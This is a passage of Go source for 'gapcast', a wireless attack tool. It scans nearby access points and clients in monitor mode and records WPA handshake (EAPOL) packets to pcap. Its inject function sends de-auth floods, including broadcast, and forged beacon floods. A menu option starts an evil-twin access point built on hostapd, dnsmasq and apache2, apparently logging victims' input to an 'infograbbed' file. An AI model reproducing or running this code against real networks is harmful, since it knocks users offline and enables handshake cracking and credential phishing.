package main

import (
	"flag"
	"fmt"
	"gapcast/libs"
	"gapcast/libs/injpacket"
	"gapcast/libs/jsonreader"
	"github.com/eiannone/keyboard"
	colo "github.com/fatih/color"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket/pcapgo"
	"github.com/rodaine/table"
	"golang.design/x/hotkey"
	"golang.org/x/exp/maps"
	"math"
	"os"
	"os/exec"
	"runtime"
	"slices"
	"sort"
	"strconv"
	"strings"
	"sync"
	"text/tabwriter"
	"time"
)

const (
	fps int = 25
)

var (
	apache2logFile   string
	apnameiface      string
	auth             string
	chTable          string
	cipher           string
	dstTable         string
	enc              string
	esdTable         string
	infograbfile     string
	macFilter        string
	nameiface        string
	srcTable         string
	pwrdbmDevice     float64
	rxdbiAnt         float64
	txdbiAnt         float64
	errTable         int
	globalChannel    int
	tableScene       int
	capturedEapol    []string
	macdb            []jsonreader.Macdb
	seqdatalist      []libs.InjectData
	color            libs.Colors
	apache2Conf      jsonreader.Apache2Conf
	radarconf        jsonreader.RadarConf
	chartBSSID       table.Table
	chartCLIENT      table.Table
	handle           *pcap.Handle
	pcapWriter       *pcapgo.Writer
	analysisData     *libs.Alldata = new(libs.Alldata)
	pcapFile         *os.File
	regDKey          *hotkey.Hotkey
	chanstage        chan bool                    = make(chan bool)
	exitChannel      chan bool                    = make(chan bool)
	mt               chan bool                    = make(chan bool)
	mtLoading        chan bool                    = make(chan bool)
	inactiveClient   map[string]libs.DeviceClient = make(map[string]libs.DeviceClient)
	inactiveDevice   map[string]libs.Device       = make(map[string]libs.Device)
	mutex            sync.RWMutex                 = sync.RWMutex{}
	elapsedTime      time.Time
	ETLogRead        bool
	G5               bool
	alreadyDKeyReg   bool
	disableInactiver bool
	enabledWriter    bool
	eviltwinAcc      bool
	eviltwinMode     bool
	eviltwinQuit     bool
	injblock         bool
	injection        bool
	oldmoment        bool = true
	onlyBeacon       bool
	openTable        bool
	panicExit        bool
	paused           bool
	pddPresent       bool
	rdaPresent       bool
	rssiRadar        bool
	sngtrgLoading    bool
	singleChannel    bool
	tdaPresent       bool
	writing          bool
	tableinj         libs.INJTable
)

// Collect all flags
func collect() (prefix string, channelList []int, pcapWriteFile string, fileLoader string, scanAfterLoad bool, scBSSID string) {
	var ch *string = flag.String("c", "-1", "")
	var load *string = flag.String("l", "?", "")
	var bssid *string = flag.String("b", "?", "")
	var prfix *string = flag.String("p", "?", "")
	var write *string = flag.String("w", "?", "")
	var g5 *bool = flag.Bool("5g", false, "")
	var g5g24 *bool = flag.Bool("2.4+5g", false, "")
	var dinac *bool = flag.Bool("d", false, "")
	var radar *bool = flag.Bool("radar", false, "")
	var beacon *bool = flag.Bool("beacon", false, "")
	var txdbi *string = flag.String("dbi-tx", "?", "")
	var rxdbi *string = flag.String("dbi-rx", "?", "")
	var pwrdbm *string = flag.String("dbm", "?", "")
	var iface *string = flag.String("i", "?", "")
	var showiface *bool = flag.Bool("show-i", false, "")
	var nmrestart *bool = flag.Bool("nm-restart", false, "")
	var sc *string = flag.String("sc", "?", "")
	var encr *string = flag.String("enc", "?", "")   // OPEN, WPE, WPA, WPA2
	var cip *string = flag.String("cipher", "?", "") // WEP, TKIP, WRAP, CCMP, WEP104
	var aut *string = flag.String("auth", "?", "")   // MGT, PSK

	flag.Usage = func() { libs.PrintUsage(); os.Exit(1) }
	flag.Parse()

	if libs.RootCheck() {
		if *iface != "?" {
			var ifaceFound bool
			for _, ifaceS := range libs.ShowIfaces() {
				if ifaceS.Name == *iface {
					ifaceFound = true
					break
				}
			}
			if !ifaceFound {
				fmt.Println("\nBad interface, if you want to see the available interfaces add -show-i parameter.")

			}
		}
		switch true {
		case *showiface:
			var writer *tabwriter.Writer = tabwriter.NewWriter(os.Stdout, 0, 0, 3, ' ', 0)
			var isPresent bool = false
			fmt.Fprintln(writer, "Interface\tHW-ADDR\tMode\tChannel\tTXpower\tDriver\tChipset")
			for _, ifaceS := range libs.ShowIfaces() {
				if ifaceinfo, err := libs.GetIfaceInfo(ifaceS.Name); !err {
					fmt.Fprintf(writer, "%s\t%s\t%s\t%s\t%s\t%s\t%s\n", ifaceS.Name, ifaceS.Mac, ifaceinfo[0], ifaceinfo[1], ifaceinfo[2], ifaceinfo[3], ifaceinfo[4])
					isPresent = true
				}
			}
			if isPresent {
				writer.Flush()
				os.Exit(0)
			} else {
				fmt.Println("No valid interface found.")
				os.Exit(1)
			}
		case *nmrestart:
			libs.Rtexec(exec.Command("bash", "-c", "killall dnsmasq hostapd"))
			if _, err := libs.Rtexec(exec.Command("bash", "-c", "iptables --flush && iptables -t nat --flush && service networking restart && service NetworkManager restart && service apache2 stop")); err {
				fmt.Println("Unable to restart Network Manager.")
				os.Exit(1)
			}
			fmt.Println("Network Manager restarted successful.")
			os.Exit(0)
		}
	} else {
		fmt.Println("Unrooted.")
		os.Exit(1)
	}

	if *sc != "?" {
		if !libs.IsValidMAC(*sc) {
			fmt.Printf("Mac address %s is invalid (-sc).\n\n", *sc)
			flag.Usage()
		}
	}
	if *iface == "?" && *load == "?" {
		fmt.Print("Select an interface. If you want to see the available interfaces add -show-i parameter.\n\n")
		flag.Usage()
	}
	if *g5 && *g5g24 {
		fmt.Print("You can't add both -5g and -2.4+5g, you have to select only one.\n\n")
		flag.Usage()
	}
	if *encr != "?" && !strings.Contains("OPEN WPE WPA WPA2", strings.ToUpper(*encr)) {
		fmt.Printf("%s is invalid parameter for enc, available: 'OPEN', 'WPE', 'WPA', 'WPA2'.\n\n", strings.ToUpper(*encr))
		flag.Usage()
	}
	if *cip != "?" && !strings.Contains("WEP TKIP WRAP CCMP WEP104 CMAC GCMP GCMP256 CCMP256 GMAC GMAC256 CMAC256", strings.ToUpper(*cip)) {
		fmt.Printf("%s is invalid parameter for cipher (-cipher), available: 'WEP', 'TKIP', 'WRAP', 'CCMP', 'WEP104'.\n\n", strings.ToUpper(*cip))
		flag.Usage()
	}
	if *aut != "?" && !strings.Contains("MGT PSK", strings.ToUpper(*aut)) {
		fmt.Printf("%s is invalid parameter for auth (-auth), available: 'MGT', 'PSK'.\n\n", strings.ToUpper(*aut))
		flag.Usage()
	}

	var lencount int = 0
	for idx, stringFlag := range []string{*ch, *bssid, *write, *iface, *prfix, *load, *sc, *txdbi, *rxdbi, *pwrdbm, *encr, *cip, *aut} {
		if (stringFlag != "?" && idx != 0) || (stringFlag != "-1" && idx == 0) {
			lencount += 2
		}
	}
	for _, boolFlag := range []bool{*g5, *g5g24, *dinac, *radar, *beacon} {
		if boolFlag {
			lencount++
		}
	}

	if len(os.Args)-1 > lencount {
		flag.Usage()
	}

	if *prfix != "?" && *bssid != "?" {
		fmt.Print("You can't add both -p and -b, -p don't work if BSSID is specified.\n\n")
		flag.Usage()
	}

	var errc error
	if *txdbi != "?" {
		if txdbiAnt, errc = strconv.ParseFloat(*txdbi, 64); errc != nil {
			fmt.Println("TX dBi " + *txdbi + " is not int or float.\n")
			flag.Usage()
		}
		tdaPresent = true
	}
	if *rxdbi != "?" {
		if rxdbiAnt, errc = strconv.ParseFloat(*rxdbi, 64); errc != nil {
			fmt.Println("RX dBi " + *rxdbi + " is not int or float.\n")
			flag.Usage()
		}
		rdaPresent = true
	}
	if *pwrdbm != "?" {
		if pwrdbmDevice, errc = strconv.ParseFloat(*pwrdbm, 64); errc != nil {
			fmt.Println("TX Power " + *pwrdbm + " is not int or float.\n")
			flag.Usage()
		}
		pddPresent = true
	}

	channelList, msgerror := libs.ParseChannels(*ch, *g5, *g5g24)
	if msgerror != "" {
		fmt.Printf("%s\n\n", msgerror)
		flag.Usage()
	}
	if !(channelList[0] != -1 && len(channelList) > 1) {
		singleChannel = true
	}

	if *bssid != "?" {
		if !libs.IsValidMAC(*bssid) {
			fmt.Printf("Mac address %s is invalid.\n\n", *bssid)
			flag.Usage()
		}
		if len(channelList) == 0 || len(channelList) > 1 {
			fmt.Print("Only one channel is needed if you use -b parameter.\n\n")
			flag.Usage()
		}
	} else {
		*bssid = ""
	}
	if *load != "?" {
		if lencount >= 4 && *iface != "?" {
			scanAfterLoad = true
		} else if lencount > 2 {
			fmt.Println(lencount)
			fmt.Print("If you have added the load parameter you cannot add other parameters if you don't specified the interface.\n\n")
			flag.Usage()
		}
	}

	macFilter = strings.ToLower(*bssid)
	G5 = *g5
	rssiRadar = *radar
	nameiface = *iface
	disableInactiver = *dinac
	enc, cipher, auth = strings.ToUpper(*encr), strings.ToUpper(*cip), strings.ToUpper(*aut)
	return strings.ToLower(*prfix), channelList, *write, *load, scanAfterLoad, *sc
}

// Exit safely from gapcast
func signalExit() {
	if ETLogRead {
		for !eviltwinQuit {
			time.Sleep(1 * time.Second)
		}
	}
	if enabledWriter {
		defer pcapFile.Close()
	}
	defer os.Exit(0)
	if oldmoment {
		mt <- true
	}
	if sngtrgLoading {
		chanstage <- true
	}
	time.Sleep(200 * time.Millisecond)
	fmt.Println()
	go libs.Loading(fmt.Sprintf("%s[%sEXIT%s] Setting up managed mode", color.White, color.Blue, color.White), mtLoading)
	if eviltwinMode && apnameiface != nameiface {
		libs.SetManagedMode(apnameiface)
	}
	libs.SetManagedMode(nameiface)
	time.Sleep(1200 * time.Millisecond)
	mtLoading <- true
	time.Sleep(800 * time.Millisecond)
	for writing {
		time.Sleep(100 * time.Millisecond)
	}
}

// Start recorder for CTRL-C -> exit
func startSignal() {
	var regKey *hotkey.Hotkey = hotkey.New([]hotkey.Modifier{hotkey.ModCtrl}, hotkey.KeyC)
	regKey.Register()
	defer regKey.Unregister()
	for {
		<-regKey.Keydown()
		<-regKey.Keyup()
		injection, openTable = false, false
		time.Sleep(100 * time.Millisecond)
		panicExit = true
		keyboard.Close()
		if eviltwinMode {
			libs.Rtexec(exec.Command("bash", "-c", "killall dnsmasq hostapd & iptables --flush & iptables -t nat --flush & service apache2 stop"))
			fmt.Print(color.White + "Done\n")
		}
		for eviltwinAcc {
			time.Sleep(1 * time.Second)
			if eviltwinQuit {
				break
			}
		}
		time.Sleep(600 * time.Millisecond)
		signalExit()
	}
}

// Setup analyzer table chart
func setupChart() {
	if rssiRadar {
		chartBSSID = table.New("BSSID", "ENC", "PWR", "BEACONS", "DATA", "CH", "ESSID", "MANUFACTURER", "RAY")
	} else {
		chartBSSID = table.New("BSSID", "ENC", "PWR", "BEACONS", "DATA", "CH", "ESSID", "MANUFACTURER")
	}
	chartBSSID.WithHeaderFormatter(colo.New(colo.BgHiBlue, colo.FgHiWhite).SprintfFunc())
	if rssiRadar {
		chartCLIENT = table.New("STATION", "BSSID", "PWR", "DATA", "ESSID", "MANUFACTURER", "RAY")
	} else {
		chartCLIENT = table.New("STATION", "BSSID", "PWR", "DATA", "ESSID", "MANUFACTURER")
	}
	chartCLIENT.WithHeaderFormatter(colo.New(colo.BgHiCyan, colo.FgHiWhite).SprintfFunc())
	analysisData.DeviceData = make(map[string]libs.Device)
	analysisData.ClientData = make(map[string]libs.DeviceClient)
}

// Preliminaries (interface management, checks, config reader...)
func setup(file string, load bool, pcapfile string) {
	go startSignal()
	if libs.WriterCheck(file) {
		enabledWriter = true
		pcapFile, err := os.Create(file)
		if err != nil {
			pcapFile.Close()
			fmt.Print("Invalid directory or file.\n\n")
			os.Exit(1)
		}
		pcapWriter = pcapgo.NewWriter(pcapFile)
		pcapWriter.WriteFileHeader(65536, layers.LinkTypeIEEE80211Radio)
	}
	libs.ScreenClear()
	color = libs.SetupColors()
	libs.PrintLogo(color, "Initializing...")
	libs.Rtexec(exec.Command("airmon-ng", "check", "kill"))
	for _, service := range []string{"apache2", "dnsmasq"} {
		if !libs.SoftwareServiceCheck(service) {
			libs.SignalError(color, fmt.Sprintf("%s isn't installed.", service))
		}
	}
	for _, software := range []string{"airmon-ng", "iptables", "hostapd", "php"} {
		if !libs.SoftwareCheck(software) {
			libs.SignalError(color, fmt.Sprintf("%s isn't installed.", software))
		}
	}

	if !libs.AlreadyMon(nameiface) {
		if !libs.MonSupportCheck(nameiface) {
			libs.SignalError(color, "Bad interface or no administrator.")
		}
		go libs.Loading(fmt.Sprintf("%s[%sINIT%s] Setting up monitor mode", color.White, color.Green, color.White), mt)
		if err := libs.SetMonitorMode(nameiface); err {
			mt <- true
			time.Sleep(400 * time.Millisecond)
			fmt.Println()
			libs.SignalError(color, "Bad interface or no administrator.")
		}
		time.Sleep(2 * time.Second)
		mt <- true
		mt = make(chan bool)
	} else {
		libs.NOTIMECustomLog(color, color.Green, "INIT", "Skipped (Monitor mode already enabled)")
		time.Sleep(1200 * time.Millisecond)
	}
	if G5 && !libs.G5Check(nameiface) {
		fmt.Println()
		libs.Error(color, fmt.Sprintf("%s does not support 5 Ghz.", nameiface))
		time.Sleep(600 * time.Millisecond)
		signalExit()
	}
	go libs.Loading(fmt.Sprintf("%s[%sINIT%s] Loading resources", color.White, color.Green, color.White), mt)
	var warning1, warning2, warning3 bool
	macdb, warning1 = jsonreader.ReadMacdb()
	apache2Conf, warning2 = jsonreader.ReadApache2Conf()
	infograbfile, apache2logFile = apache2Conf.InfoGrabbed, apache2Conf.LOGFile
	radarconf, warning3 = jsonreader.ReadRadarConf()
	setupChart()
	time.Sleep(1500 * time.Millisecond)
	mt <- true
	if rssiRadar {
		if tdaPresent && rdaPresent && pddPresent {
			radarconf = jsonreader.RadarConf{TXAntennaDBI: txdbiAnt, RXAntennaDBI: rxdbiAnt, TXPowerDBM: pwrdbmDevice}
		} else {
			for radaridx, isPresent := range []bool{tdaPresent, rdaPresent, pddPresent} {
				if isPresent {
					switch radaridx {
					case 1:
						radarconf.TXAntennaDBI = txdbiAnt
					case 2:
						radarconf.RXAntennaDBI = rxdbiAnt
					case 3:
						radarconf.TXPowerDBM = pwrdbmDevice
					}
				}
			}
		}
	}
	for warnidx, warn := range []bool{warning1, warning2, warning3} {
		if warn {
			switch warnidx {
			case 0:
				libs.Warning(color, "Failure to read the manufacturer db.")
			case 1:
				infograbfile = "/var/www/html/infograbbed.txt" // default
				apache2logFile = "/var/log/apache2/access.log" // default
				libs.Warning(color, "Failure to read the apache2 config, set default (access.log file).")
			case 2:
				libs.Warning(color, "Failure to read RadioRSSI config, set default.")
			}
			time.Sleep(1200 * time.Millisecond)
		}
	}
	if load {
		mt = make(chan bool)
		go libs.Loading(fmt.Sprintf("%s[%sINIT%s] Loading pcap file", color.White, color.Green, color.White), mt)
		handle, err := pcap.OpenOffline(pcapfile)
		time.Sleep(1500 * time.Millisecond)
		if err != nil {
			mt <- true
			libs.Error(color, "No valid resources loaded.")
			time.Sleep(1200 * time.Millisecond)
		} else {
			defer handle.Close()
			handlePacket(handle, libs.G5g24Channels[:], "?", false, true)
			mt <- true
			if len(analysisData.DeviceData) <= 0 {
				libs.Error(color, "No valid resources loaded.")
				time.Sleep(1200 * time.Millisecond)
			}
		}
	}
	oldmoment = false
	time.Sleep(1 * time.Second)
}

// Change interface channel automatically
func channelChanger(channelList []int) {
	var changeCh func([]int, string) = func(channelList []int, nameiface string) {
		if singleChannel {
			libs.ChangeChannel(nameiface, channelList[0])
			globalChannel = channelList[0]
			time.Sleep(180 * time.Millisecond)
		} else {
			for {
				for _, ch := range channelList {
					select {
					case <-exitChannel:
						return
					default:
						for paused || injblock {
							time.Sleep(100 * time.Millisecond)
						}
						libs.ChangeChannel(nameiface, ch)
						mutex.Lock()
						globalChannel = ch
						mutex.Unlock()
						time.Sleep(180 * time.Millisecond)
					}
				}
			}
		}
	}
	if singleChannel {
		changeCh(channelList, nameiface)
	} else {
		go changeCh(channelList, nameiface)
	}
}

// Update analyzer table
func update() {
	if elapsedTime == (time.Time{}) {
		elapsedTime = time.Now()
	}
	for {
		time.Sleep(time.Duration(1000/fps) * time.Millisecond)
		if panicExit {
			exitChannel <- true
			for {
				time.Sleep(2 * time.Second)
			}
		}
		printChart(false)
	}
}

// Detect EAPOL Key and rec it (optional: write on pcap file)
func recEapol(packet gopacket.Packet) {
	ap, sta := libs.GetEAPOL_APSTA(packet)
	if libs.IsValidMAC(ap) && libs.IsValidMAC(sta) && !slices.Contains(capturedEapol, fmt.Sprintf("%s<-%s", ap, sta)) {
		capturedEapol = append(capturedEapol, fmt.Sprintf("%s<-%s", ap, sta))
	}
	if packet.Layer(layers.LayerTypeEAPOLKey) != nil {
		mutex.Lock()
		writeToPcap(packet)
		mutex.Unlock()
	}
}

// Write packet on pcap file
func writeToPcap(packet gopacket.Packet) {
	if enabledWriter && !panicExit {
		writing = true
		pcapWriter.WritePacket(gopacket.CaptureInfo{
			Timestamp:     time.Now(),
			Length:        len(packet.Data()),
			CaptureLength: len(packet.Data()),
		}, packet.Data())
		writing = false
	}
}

// Analyze packet and extract info
func handlePacket(handle *pcap.Handle, chans []int, prefix string, filter bool, offload bool) {
	var packets *gopacket.PacketSource = gopacket.NewPacketSource(handle, handle.LinkType())
	defer handle.Close()

	var firstMP, lastMP time.Time
	if offload {
		defer func() { elapsedTime = time.Now().Add(-lastMP.Sub(firstMP)) }()
	}

	for pkt := range packets.Packets() {
		if paused || panicExit {
			return
		}
		if offload {
			lastMP = pkt.Metadata().Timestamp
			if firstMP.IsZero() {
				firstMP = pkt.Metadata().Timestamp
			}
		}
		if pkt.ErrorLayer() == nil && pkt != nil && pkt.Layer(layers.LayerTypeDot11) != nil {
			if singleChannel {
				go recEapol(pkt)
			}
			go func(packet gopacket.Packet) {
				if PWR, err := libs.GetDBM(packet); !err {
					if libs.IsBeacon(packet) {
						if SRC, err1 := libs.GetSRCBeacon(packet); !err1 && (!filter || ((macFilter == "" || strings.EqualFold(macFilter, SRC)) && (prefix == "?" || strings.HasPrefix(strings.ToLower(SRC), strings.ToLower(prefix))))) {
							var ENC string = libs.GetENCSuite(packet)
							if filter && ((enc != "?" && !strings.Contains(ENC, enc)) || (cipher != "?" && !strings.Contains(ENC, cipher)) || (auth != "?" && !strings.Contains(ENC, auth))) {
								return
							}
							var Channel int = libs.GetAPChannel(packet)
							if Channel > 0 && slices.Contains(chans, Channel) && (!filter || !singleChannel || Channel == globalChannel) {
								var oldBeacon, oldData int = 0, 0
								var ESSID, MANUFTR string = libs.GetESSID(packet), ""
								mutex.Lock()
								if _, exist3 := analysisData.DeviceData[SRC]; exist3 {
									oldBeacon = analysisData.DeviceData[SRC].Beacons
									oldData = analysisData.DeviceData[SRC].Data
									if ESSID == "<unavailable>" && analysisData.DeviceData[SRC].Essid != ESSID {
										ESSID = analysisData.DeviceData[SRC].Essid
									}
									MANUFTR = analysisData.DeviceData[SRC].Manufacturer
								} else {
									MANUFTR = libs.GetManufacturer(macdb, SRC)
								}
								if _, exist4 := inactiveDevice[SRC]; exist4 {
									analysisData.DeviceData[SRC] = libs.Device{Essid: inactiveDevice[SRC].Essid, Power: inactiveDevice[SRC].Power, Beacons: inactiveDevice[SRC].Beacons + 1, Data: inactiveDevice[SRC].Data, Ch: inactiveDevice[SRC].Ch, Enc: inactiveDevice[SRC].Enc, Manufacturer: inactiveDevice[SRC].Manufacturer, LastUpdate: time.Now()}
									delete(inactiveDevice, SRC)
								} else {
									analysisData.DeviceData[SRC] = libs.Device{Essid: ESSID, Power: int(PWR), Beacons: oldBeacon + 1, Data: oldData, Ch: Channel, Enc: ENC, Manufacturer: MANUFTR, LastUpdate: time.Now()}
								}
								writeToPcap(packet)
								mutex.Unlock()
							}
						}
					} else if BSSID_CLIENT, MAC, err := libs.GetAPSTAData(packet); libs.IsData(packet) && !err {
						if filter && (strings.EqualFold(BSSID_CLIENT, MAC) || strings.EqualFold(MAC, "ff:ff:ff:ff:ff:ff") || (macFilter != "" && !strings.EqualFold(macFilter, BSSID_CLIENT))) {
							return
						}
						mutex.Lock()
						if _, exist1 := analysisData.DeviceData[BSSID_CLIENT]; exist1 {
							analysisData.DeviceData[BSSID_CLIENT] = libs.Device{Essid: analysisData.DeviceData[BSSID_CLIENT].Essid, Power: analysisData.DeviceData[BSSID_CLIENT].Power, Beacons: analysisData.DeviceData[BSSID_CLIENT].Beacons, Data: analysisData.DeviceData[BSSID_CLIENT].Data + 1, Manufacturer: analysisData.DeviceData[BSSID_CLIENT].Manufacturer, Ch: analysisData.DeviceData[BSSID_CLIENT].Ch, Enc: analysisData.DeviceData[BSSID_CLIENT].Enc, LastUpdate: time.Now()}
							if _, exist2 := inactiveClient[MAC]; exist2 {
								analysisData.ClientData[MAC] = libs.DeviceClient{Bssid: inactiveClient[MAC].Bssid, Essid: inactiveClient[MAC].Essid, Manufacturer: inactiveClient[MAC].Manufacturer, Data: inactiveClient[MAC].Data + 1, Power: int(PWR), LastUpdate: time.Now()}
								delete(inactiveClient, MAC)
							} else if _, exist3 := analysisData.ClientData[MAC]; exist3 {
								analysisData.ClientData[MAC] = libs.DeviceClient{Bssid: analysisData.ClientData[MAC].Bssid, Essid: analysisData.ClientData[MAC].Essid, Data: analysisData.ClientData[MAC].Data + 1, Manufacturer: analysisData.ClientData[MAC].Manufacturer, Power: int(PWR), LastUpdate: time.Now()}
							} else {
								analysisData.ClientData[MAC] = libs.DeviceClient{Bssid: BSSID_CLIENT, Essid: analysisData.DeviceData[BSSID_CLIENT].Essid, Data: 1, Power: int(PWR), Manufacturer: libs.GetManufacturer(macdb, MAC), LastUpdate: time.Now()}
							}
						}
						writeToPcap(packet)
						mutex.Unlock()
					} else {
						if packet.Layer(layers.LayerTypeLLC) == nil {
							mutex.Lock()
							writeToPcap(packet)
							mutex.Unlock()
						}
					}
				}

			}(pkt)
		}
	}
}

// Reset view of inactive device on analyzer table (restoring of all info)
func resetPreActive() {
	mutex.Lock()
	for mac := range analysisData.ClientData {
		analysisData.ClientData[mac] = libs.DeviceClient{Power: analysisData.ClientData[mac].Power, Bssid: analysisData.ClientData[mac].Bssid, Essid: analysisData.ClientData[mac].Essid, Data: analysisData.ClientData[mac].Data, Manufacturer: analysisData.ClientData[mac].Manufacturer, LastUpdate: time.Now()}
	}
	for bssid := range analysisData.DeviceData {
		analysisData.DeviceData[bssid] = libs.Device{Essid: analysisData.DeviceData[bssid].Essid, Power: analysisData.DeviceData[bssid].Power, Beacons: analysisData.DeviceData[bssid].Beacons, Data: analysisData.DeviceData[bssid].Data, Ch: analysisData.DeviceData[bssid].Ch, Enc: analysisData.DeviceData[bssid].Enc, Manufacturer: analysisData.DeviceData[bssid].Manufacturer, LastUpdate: time.Now()}
	}
	mutex.Unlock()
}

// Move active device to inactive device (when gapcast does not found more info of it from 30s)
func moveActiveToInactive() {
	for {
		time.Sleep(100 * time.Millisecond)
		if paused || panicExit {
			return
		}
		if injblock {
			for {
				time.Sleep(100 * time.Millisecond)
				if !injblock {
					resetPreActive()
					break
				}
			}
		}
		mutex.Lock()
		for mac, devices := range analysisData.ClientData {
			if time.Since(devices.LastUpdate).Seconds() > 30 {
				delete(analysisData.ClientData, mac)
				inactiveClient[mac] = devices
			}
		}
		for bssid, devices := range analysisData.DeviceData {
			if time.Since(devices.LastUpdate).Seconds() > 30 {
				delete(analysisData.DeviceData, bssid)
				inactiveDevice[bssid] = devices
			}
		}
		mutex.Unlock()
	}
}

// Get AP channel from analysis data
func getChFromSaved(mac string) int {
	mac = strings.ToUpper(libs.Fmac(mac))
	if data, exist := analysisData.DeviceData[mac]; exist {
		return data.Ch
	} else if data, exist := inactiveDevice[mac]; exist {
		return data.Ch
	}
	return -1
}

// Sort AP's MAC Addresses from associated channel
func sortForChannel(macs []string) []string {
	for i := 0; i < len(macs)-1; i++ {
		for j := 0; j < len(macs)-i-1; j++ {
			if getChFromSaved(macs[j]) > getChFromSaved(macs[j+1]) {
				macs[j], macs[j+1] = macs[j+1], macs[j]
			}
		}
	}
	return macs
}

// Get all STAs from BSSIDs
func getStationsFromBSSIDs(BSSIDs []string) []string {
	var stations []string
	if len(BSSIDs) < 1 {
		return stations
	}
	for staaddr, station := range analysisData.ClientData {
		if strings.EqualFold(libs.Fmac(BSSIDs[0]), station.Bssid) {
			stations = append(stations, staaddr)
		}
	}
	return stations
}

// With INJ info & selection inject independetly packets
func inject(nameiface string) {
	var injtype, injessid string = tableinj.INJ, tableinj.ESSID
	var sMac, sdtype, injsrc, injdst string
	var mMac []string
	var prevch int
	mutex.Lock()
	var injch int = tableinj.CHANNEL
	if len(tableinj.SRC) >= len(tableinj.DST) {
		if injtype == "De-Auth" {
			mMac = sortForChannel(tableinj.SRC)
		} else {
			mMac = tableinj.SRC
		}
		sMac, sdtype = tableinj.DST[0], "src"
	} else {
		if injtype == "De-Auth" {
			mMac = sortForChannel(tableinj.DST)
		} else {
			mMac = tableinj.DST
		}
		sMac, sdtype = tableinj.SRC[0], "dst"
	}
	injblock = true
	mutex.Unlock()
	defer func() { injblock = false }()
	if len(mMac) > 2 {
		go func() {
			for {
				for _, m := range mMac {
					mutex.Lock()
					seqdatalist[len(seqdatalist)-1].Target = injdst
					mutex.Unlock()
					time.Sleep(500 * time.Millisecond)
					if sdtype == "src" {
						injdst = sMac
					} else {
						injdst = m
					}
				}
				if !injection {
					return
				}
				for paused {
					time.Sleep(100 * time.Millisecond)
				}
			}
		}()
	}
	for {
		if injtype == "Beacon" {
			var waitTime time.Duration = time.Duration(102.4 * float64(time.Millisecond))
			for seq := 0; seq < 64; seq++ {
				seqdatalist = append(seqdatalist, libs.InjectData{Of1: 0, Of2: len(mMac), Target: sMac, Failed: false, Seq: "no-value"})
				if len(seqdatalist) == 1 {
					mutex.Lock()
					tableScene = 8
					mutex.Unlock()
				}
				for _, injsrc := range mMac {
					prevch = globalChannel
					globalChannel = injch
					if ptempl := injpacket.Beacon(injessid, injsrc, injch, seq); injpacket.InjectPacket(handle, nameiface, injch, prevch, ptempl) {
						seqdatalist[len(seqdatalist)-1].Of1++
					} else {
						seqdatalist[len(seqdatalist)-1].Failed = true
					}
					time.Sleep(waitTime)
					if !injection {
						return
					}
					for paused {
						time.Sleep(1 * time.Second)
					}
				}
			}
		} else if injtype == "De-Auth" {
			seqdatalist = append(seqdatalist, libs.InjectData{Of1: 0, Of2: len(mMac), Target: injdst, Failed: false, Seq: "0"})
			if len(seqdatalist) == 1 {
				mutex.Lock()
				tableScene = 8
				mutex.Unlock()
			}
			for _, m := range mMac {
				if sdtype == "src" {
					injsrc = m
					injdst = sMac
				} else {
					injsrc = sMac
					injdst = m
				}
				mutex.Lock()
				injch = getChFromSaved(injsrc)
				mutex.Unlock()
				prevch = globalChannel
				globalChannel = injch
				if len(mMac) < 3 {
					seqdatalist[len(seqdatalist)-1].Target = injdst
				}
				var seqSize int
				if libs.Fmac(injdst) == "FF:FF:FF:FF:FF:FF" {
					seqSize = 128
				} else {
					seqSize = 64
				}
				for seq := 0; seq < seqSize; seq++ {
					seqdatalist[len(seqdatalist)-1].Seq = libs.GetCapsFormat(strconv.Itoa(seq+1), 3, "0")
					if ptempl := injpacket.Deauth(injsrc, injdst, seq); !injpacket.InjectPacket(handle, nameiface, injch, prevch, ptempl) {
						seqdatalist[len(seqdatalist)-1].Failed = true
					}
					time.Sleep(2 * time.Millisecond)
					if !injection {
						return
					}
					for paused {
						time.Sleep(1 * time.Second)
					}
				}
				seqdatalist[len(seqdatalist)-1].Of1++
			}
			time.Sleep(180 * time.Millisecond)
		}
	}
}

// Start recording of CTRL-D for starting injection
func regD(nameiface string) {
	if !alreadyDKeyReg {
		regDKey = hotkey.New([]hotkey.Modifier{hotkey.ModCtrl}, hotkey.KeyD)
		alreadyDKeyReg = true
		regDKey.Register()
	}
	for {
		time.Sleep(100 * time.Millisecond)
		select {
		case <-regDKey.Keydown():
			<-regDKey.Keyup()
			mutex.Lock()
			if injection {
				injection = false
				tableScene = 7
			} else {
				seqdatalist = []libs.InjectData{}
				injection = true
				go inject(nameiface)
			}
			mutex.Unlock()
		default:
			mutex.Lock()
			if !openTable {
				injection = false
				mutex.Unlock()
				return
			}
			mutex.Unlock()
		}
	}
}

// Selection of INJ attack from INJ Table
func regXINJ(nameiface string, ChannelList []int) {
	event, _ := keyboard.GetKeys(10)
	for {
		eventdata := <-event
		mutex.Lock()
		if eventdata.Key == keyboard.KeyEsc {
			openTable = false
			keyboard.Close()
			mutex.Unlock()
			return
		}
		switch eventdata.Rune {
		case '1':
			tableinj = libs.INJTable{INJ: "De-Auth"}
			tableScene = 1
			keyboard.Close()
			go reg1234(nameiface, ChannelList)
			mutex.Unlock()
			return
		case '2':
			tableinj = libs.INJTable{INJ: "Beacon", DST: []string{"ffffffffffff"}}
			tableScene = 1
			keyboard.Close()
			go reg1234(nameiface, ChannelList)
			mutex.Unlock()
			return
		case '3':
			if chfromsaved := getChFromSaved(macFilter); macFilter != "" && chfromsaved != -1 {
				tableinj = libs.INJTable{INJ: "Evil-Twin", DST: []string{"ffffffffffff"}, SRC: []string{strings.ToLower(strings.ReplaceAll(macFilter, ":", ""))}}
				tableinj.ESSID = analysisData.DeviceData[libs.Fmac(macFilter)].Essid
				tableinj.CHANNEL = chfromsaved
				tableScene, openTable = 0, false
				keyboard.Close()
				panicExit = true
				mutex.Unlock()
				time.Sleep(150 * time.Millisecond)
				runEvilTwin(nameiface)
				return
			}
			tableinj = libs.INJTable{INJ: "Evil-Twin", DST: []string{"ffffffffffff"}}
			tableScene = 2
			keyboard.Close()
			go regWM("src", nameiface, ChannelList)
			mutex.Unlock()
			return
		}
		mutex.Unlock()
	}
}

// Selection of ESSID from INJ Table
func regESSID(nameiface string) {
	event, _ := keyboard.GetKeys(10)
	for {
		eventdata := <-event
		mutex.Lock()
		if eventdata.Key == keyboard.KeyEsc {
			openTable = false
			keyboard.Close()
			mutex.Unlock()
			return
		}
		if (eventdata.Key == keyboard.KeyBackspace || eventdata.Key == keyboard.KeyBackspace2) && len(esdTable) > 0 {
			esdTable = esdTable[:len(esdTable)-1]
			mutex.Unlock()
			continue
		}
